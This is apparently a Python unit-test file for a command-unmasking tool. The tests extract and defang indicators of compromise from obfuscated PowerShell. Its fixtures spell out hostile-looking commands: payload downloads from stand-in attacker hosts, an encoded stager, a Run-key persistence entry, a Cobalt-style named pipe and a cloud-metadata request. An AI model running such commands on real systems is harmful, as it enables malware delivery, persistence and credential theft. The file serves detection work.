import base64
import io
import json
import unittest
from contextlib import redirect_stdout

from cmd_unmask import unmask_command, unpack_dag
from cmd_unmask.cli import main
from cmd_unmask.ioc import defang_ioc, extract_iocs


class TestContextualIocExtractorAndDefanging(unittest.TestCase):
    def test_defang_url_ip_and_domain(self) -> None:
        self.assertEqual(
            defang_ioc("url", "http://evil.com:8080/a/b.ps1"),
            "hxxp://evil[.]com[:]8080/a/b.ps1",
        )
        self.assertEqual(
            defang_ioc("url", "https://198.51.100.42:8443/stage"),
            "hxxps://198[.]51[.]100[.]42[:]8443/stage",
        )
        self.assertEqual(defang_ioc("ipv4", "203.0.113.9"), "203[.]0[.]113[.]9")
        self.assertEqual(defang_ioc("domain", "c2.bad-actor.org"), "c2[.]bad-actor[.]org")

    def test_extracts_all_ioc_types_across_full_dag_with_node_provenance(self) -> None:
        inner = (
            "Invoke-WebRequest http://evil.example:8080/drop.exe -OutFile C:\\Users\\Public\\drop.exe; "
            "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Persist /d /tmp/implant.sh; "
            "type \\\\.\\pipe\\cobalt_beacon; "
            "ping 198.51.100.77 2001:db8::8a2e:370:7334 c2.attacker.net "
            "d41d8cd98f00b204e9800998ecf8427e"
        )
        b64 = base64.b64encode(inner.encode("utf-16le")).decode("ascii")
        # Outer layer also has an intermediate stager domain/URL
        outer = f"powershell.exe -c \"# stage0 http://stager0.evil.org/init\" -enc {b64}"
        dag = unpack_dag(outer)
        iocs = extract_iocs(dag)
        by_type = {}
        for item in iocs:
            by_type.setdefault(item.ioc_type, []).append(item)

        urls = [x.raw_value for x in by_type.get("url", [])]
        self.assertIn("http://stager0.evil.org/init", urls)
        self.assertIn("http://evil.example:8080/drop.exe", urls)
        # Stager0 comes from node_0, inner comes from a decoded child node
        stager_ioc = next(x for x in by_type["url"] if "stager0" in x.raw_value)
        inner_ioc = next(x for x in by_type["url"] if "drop.exe" in x.raw_value)
        self.assertEqual(stager_ioc.source_node_id, "node_0")
        self.assertNotEqual(inner_ioc.source_node_id, "node_0")
        self.assertEqual(inner_ioc.defanged_value, "hxxp://evil[.]example[:]8080/drop.exe")

        self.assertTrue(any(x.raw_value == "198.51.100.77" for x in by_type.get("ipv4", [])))
        self.assertTrue(any("2001:db8::8a2e:370:7334" in x.raw_value for x in by_type.get("ipv6", [])))
        self.assertTrue(any(x.raw_value == "c2.attacker.net" for x in by_type.get("domain", [])))
        self.assertTrue(any("C:\\Users\\Public\\drop.exe" in x.raw_value for x in by_type.get("filepath", [])))
        self.assertTrue(any("/tmp/implant.sh" in x.raw_value for x in by_type.get("filepath", [])))
        self.assertTrue(any("HKCU\\Software" in x.raw_value for x in by_type.get("registry_key", [])))
        self.assertTrue(any("\\.\\pipe\\cobalt_beacon" in x.raw_value for x in by_type.get("named_pipe", [])))
        self.assertTrue(any(x.raw_value == "d41d8cd98f00b204e9800998ecf8427e" for x in by_type.get("hash_md5", [])))

    def test_suppresses_dotnet_namespaces_script_filenames_and_hex_blobs(self) -> None:
        hex_cmd = b"powershell -c Write-Host hello_world".hex()  # 72 hex chars, or 64-char hex command
        hex_32 = b"powershell -nop ".hex()  # 32 hex chars (16 bytes) decoded as hex command
        cmd = (
            f"powershell.exe -c \"[System.Net.WebClient] [IO.Compression.GzipStream] "
            f"[Text.Encoding]::UTF8 [Microsoft.Win32.Registry] script.ps1 payload.exe "
            f"{'a' * 32} {hex_32} {hex_cmd}\""
        )
        verdict = unmask_command(cmd)
        domains = [i.raw_value for i in verdict.iocs if i.ioc_type == "domain"]
        self.assertEqual(domains, [])
        hashes = [i.raw_value for i in verdict.iocs if i.ioc_type.startswith("hash_")]
        self.assertNotIn("a" * 32, hashes)
        self.assertNotIn(hex_32, hashes)

    def test_cli_defang_default_and_no_defang_override(self) -> None:
        buf_defang = io.StringIO()
        with redirect_stdout(buf_defang):
            main(["-c", "powershell -c http://evil.example:8080/a.ps1", "--format", "json"])
        data_defang = json.loads(buf_defang.getvalue())
        self.assertEqual(data_defang["iocs"][0]["value"], "hxxp://evil[.]example[:]8080/a.ps1")

        buf_raw = io.StringIO()
        with redirect_stdout(buf_raw):
            main(["-c", "powershell -c http://evil.example:8080/a.ps1", "--no-defang", "--format", "json"])
        data_raw = json.loads(buf_raw.getvalue())
        self.assertEqual(data_raw["iocs"][0]["value"], "http://evil.example:8080/a.ps1")

    def test_tag_cloud_metadata_endpoints(self) -> None:
        cmd_meta = "Invoke-RestMethod -Method GET -Headers @{} http://169.254.169.254/opc/v1/instance"
        verdict_meta = unmask_command(cmd_meta)
        meta_iocs = verdict_meta.iocs
        self.assertTrue(len(meta_iocs) >= 2)
        url_ioc = next(i for i in meta_iocs if i.ioc_type == "url")
        ip_ioc = next(i for i in meta_iocs if i.ioc_type == "ipv4")
        self.assertTrue(url_ioc.is_cloud_metadata)
        self.assertTrue(ip_ioc.is_cloud_metadata)

        # Bare IP 169.254.169.254
        v_bare = unmask_command("ping 169.254.169.254")
        bare_ioc = next(i for i in v_bare.iocs if i.ioc_type == "ipv4")
        self.assertTrue(bare_ioc.is_cloud_metadata)

        # Other link-local (non-metadata) 169.254.1.1 must NOT be tagged as cloud metadata
        v_ll = unmask_command("ping 169.254.1.1; curl http://169.254.1.1/test")
        for i in v_ll.iocs:
            self.assertFalse(i.is_cloud_metadata, f"Non-metadata IP/URL was unexpectedly tagged: {i}")

        # Regular external IP / domain
        v_ext = unmask_command("curl http://198.51.100.42/payload")
        for i in v_ext.iocs:
            self.assertFalse(i.is_cloud_metadata)

        # JSON serialization includes is_cloud_metadata
        v_dict = verdict_meta.to_dict()
        for i_dict in v_dict["iocs"]:
            self.assertIn("is_cloud_metadata", i_dict)
            self.assertTrue(i_dict["is_cloud_metadata"])


if __name__ == "__main__":
    unittest.main()
